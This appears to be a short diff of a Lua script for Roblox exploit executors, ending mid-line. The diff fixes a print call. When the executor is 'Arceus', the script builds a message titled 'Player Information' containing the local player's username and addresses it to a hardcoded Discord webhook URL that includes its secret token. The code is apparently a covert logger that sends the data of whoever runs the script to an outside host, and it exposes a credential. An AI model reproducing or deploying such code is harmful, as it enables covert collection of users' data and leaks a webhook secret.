@@ -1,6 +1,6 @@
  --i totally did not steal this from Vhub
 local exploits = identifyexecutor() 
-print(exploits "|")
+print(exploits,"|")
 if exploits == "Arceus" then
 local url = "https://discord.com/api/webhooks/958848736434475038/GNo3pO5oEYshyipJSgAXAMYAU9Bzrm3F_xWq636CzHVhiPdEgIaFCO2kka5NMUat0REp"
 local data = { ["content"] = "", ["embeds"] = { { ["title"] = "Player Information:", ["description"] = "Username: " ..game.Players.LocalPlayer.Name..
